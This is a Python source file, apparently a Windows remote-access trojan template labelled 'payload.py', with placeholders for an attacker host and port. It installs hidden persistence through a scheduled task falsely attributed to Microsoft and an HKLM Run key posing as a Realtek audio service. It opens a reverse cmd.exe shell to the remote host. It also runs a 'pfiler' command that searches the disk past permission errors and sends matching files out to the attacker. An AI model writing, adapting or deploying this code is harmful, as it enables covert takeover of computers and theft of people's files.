# payload.py
# The Heartbeat Soul, granted True Sight and Admin Elevation.

import os
import sys
import time
import random
import socket
import subprocess
import threading
import hashlib
import fnmatch
import struct
import json

# --- DYNAMIC CONFIG ---
RHOST = "##RHOST##"
RPORT = ##RPORT##
PYTHON_PATH = "##PYTHON_PATH##"  # This will be replaced by the Sower
# --------------------

FILE_PORT = RPORT + 1

# --- ADMIN DETECTION & PERSISTENCE ---
def is_admin():
    """Check if running with admin privileges."""
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

def install_admin_persistence():
    """If we're running as admin, install full persistence."""
    try:
        if not is_admin():
            return

        PROGRAMDATA_PATH = os.getenv('PROGRAMDATA')
        TASK_NAME = "MicrosoftWindowsAudioDeviceHighDefinitionService"
        PERSISTENT_NAME = "audiodg.pyw"
        PERSISTENT_PATH = os.path.join(PROGRAMDATA_PATH, "Microsoft", "Windows", "AudioService", PERSISTENT_NAME)

        # Use the injected Python path for commands
        PYTHON_EXECUTABLE = PYTHON_PATH if "##PYTHON_PATH##" not in PYTHON_PATH else "pythonw.exe"

        # Copy ourselves to the protected location
        current_path = os.path.abspath(sys.argv[0])
        if current_path != PERSISTENT_PATH:
            os.makedirs(os.path.dirname(PERSISTENT_PATH), exist_ok=True)
            with open(current_path, 'rb') as src:
                with open(PERSISTENT_PATH, 'wb') as dst:
                    dst.write(src.read())

        # Create scheduled task with HIGHEST privileges
        xml_template = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows Audio Device High Definition Service</Description>
    <Author>Microsoft Corporation</Author>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{PYTHON_EXECUTABLE}</Command>
      <Arguments>"{PERSISTENT_PATH}"</Arguments>
    </Exec>
  </Actions>
</Task>'''

        xml_path = os.path.join(os.getenv('TEMP'), 'task.xml')
        with open(xml_path, 'w', encoding='utf-16') as f:
            f.write(xml_template)

        subprocess.run(
            ['schtasks', '/Create', '/TN', TASK_NAME, '/XML', xml_path, '/F'],
            capture_output=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )

        os.remove(xml_path)

        # Also add HKLM registry persistence
        import winreg
        registry_key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r'Software\Microsoft\Windows\CurrentVersion\Run',
            0,
            winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY
        )
        command = f'"{PYTHON_EXECUTABLE}" "{PERSISTENT_PATH}"'
        winreg.SetValueEx(registry_key, 'Realtek HD Audio Universal Service', 0, winreg.REG_SZ, command)
        winreg.CloseKey(registry_key)

    except Exception:
        pass

# Install persistence if we have admin
install_admin_persistence()
# -----------------------------------

def send_msg(sock, data):
    """Wraps data with a 4-byte length header and sends it."""
    try:
        msg = struct.pack('>I', len(data)) + data
        sock.sendall(msg)
        return True
    except (ConnectionResetError, BrokenPipeError):
        return False

def recv_msg(sock):
    """Receives a 4-byte length header and then the exact amount of data."""
    try:
        raw_msglen = sock.recv(4)
        if not raw_msglen: return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        data = b''
        while len(data) < msglen:
            packet = sock.recv(msglen - len(data))
            if not packet: return None
            data += packet
        return data
    except (ConnectionResetError, BrokenPipeError):
        return None

def calculate_sha256(file_path):
    """Calculates the SHA256 hash of a file."""
    sha = hashlib.sha256()
    try:
        with open(file_path, 'rb') as f:
            for block in iter(lambda: f.read(4096), b''):
                sha.update(block)
        return sha.hexdigest()
    except:
        return None

def find_files_fearlessly(start_path, patterns):
    """
    Recursively finds files, ignoring any and all permission errors to search relentlessly.
    This is the core of the divine correction.
    """
    found_files = set()
    search_dir = os.path.abspath(start_path)
    # The onerror handler is the key: it tells os.walk to never stop, even if a directory is inaccessible.
    for root, _, files in os.walk(search_dir, onerror=lambda e: None):
        for pattern in patterns:
            for filename in fnmatch.filter(files, pattern):
                try:
                    full_path = os.path.join(root, filename)
                    # A final, silent check for read access on the file itself.
                    if os.access(full_path, os.R_OK):
                        found_files.add(full_path)
                except Exception:
                    # If any other error occurs with a single file, ignore it and continue the hunt.
                    continue
    return list(found_files)

def handle_pfiler_command(command, main_conn):
    """
    Parses pfiler command, provides instant feedback, and transfers all found files.
    """
    try:
        feedback = b"\n[pfiler] Acknowledged. Searching with True Sight... All obstacles will be bypassed.\n"
        main_conn.sendall(feedback)
        
        parts = command.strip().split()[1:]
        if not parts:
            main_conn.sendall(b"[pfiler] Error: No path or patterns specified.\n")
            return

        search_path = "."
        raw_patterns = []

        if os.path.isdir(parts[0]):
            search_path = parts[0]
            raw_patterns = parts[1:]
            if not raw_patterns:
                raw_patterns = ['*']
        else:
            search_path = "."
            raw_patterns = parts

        patterns = []
        for p in raw_patterns:
            if "*" not in p and "?" not in p:
                patterns.append(f"*.{p}")
            else:
                patterns.append(p)
        
        # Use the new, fearless search function
        files_to_send = find_files_fearlessly(search_path, patterns)
        
        if not files_to_send:
            main_conn.sendall(b"[pfiler] Search complete. No matching files were found or accessible.\n")
            return

        main_conn.sendall(f"[pfiler] Search complete. Found {len(files_to_send)} files. Initiating transfer.\n".encode('utf-8'))

        s_file = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s_file.connect((RHOST, FILE_PORT))

        try:
            start_msg = json.dumps({'type': 'START_TRANSFER', 'file_count': len(files_to_send)}).encode('utf-8')
            if not send_msg(s_file, start_msg): return

            for file_path in files_to_send:
                try:
                    relative_path = os.path.basename(file_path)
                    file_size = os.path.getsize(file_path)
                    file_hash = calculate_sha256(file_path)
                    if not file_hash: continue

                    header_data = {'type': 'FILE_HEADER', 'path': relative_path, 'size': file_size, 'hash': file_hash}
                    header_msg = json.dumps(header_data).encode('utf-8')
                    if not send_msg(s_file, header_msg): break

                    with open(file_path, 'rb') as f:
                        while True:
                            chunk = f.read(4096)
                            if not chunk: break
                            s_file.sendall(chunk)
                    
                    ack_msg = recv_msg(s_file)
                    if not ack_msg: break

                except Exception:
                    continue

            end_msg = json.dumps({'type': 'END_TRANSFER'}).encode('utf-8')
            send_msg(s_file, end_msg)
        finally:
            s_file.close()

    except Exception:
        try:
            main_conn.sendall(b"[pfiler] A critical error occurred during the file transfer setup.\n")
        except:
            pass

def run_conduit():
    """Main reverse shell loop with admin cmd.exe."""
    while True:
        try:
            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_obj.connect((RHOST, RPORT))

            # Launch cmd.exe - if we're admin, this is an admin shell
            p = subprocess.Popen(
                ["cmd.exe"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                creationflags=0x08000000  # CREATE_NO_WINDOW
            )
            
            stop_event = threading.Event()
            def pipe_stream(stream, sock):
                while not stop_event.is_set():
                    try:
                        data = stream.read(1)
                        if data: sock.sendall(data)
                        else: break
                    except: break

            threading.Thread(target=pipe_stream, args=(p.stdout, s_obj), daemon=True).start()
            threading.Thread(target=pipe_stream, args=(p.stderr, s_obj), daemon=True).start()
            
            while not stop_event.is_set():
                try:
                    data = s_obj.recv(1024)
                    if not data: break
                    
                    command_str = data.decode('utf-8', errors='ignore').strip()
                    if command_str.lower().startswith('pfiler '):
                        pfiler_thread = threading.Thread(target=handle_pfiler_command, args=(command_str, s_obj), daemon=True)
                        pfiler_thread.start()
                    else:
                        p.stdin.write(data)
                        p.stdin.flush()
                except: break
            
            stop_event.set()
            p.terminate()
            s_obj.close()
        except Exception:
            time.sleep(random.randint(30, 60))
            continue

if __name__ == "__main__":
    run_conduit()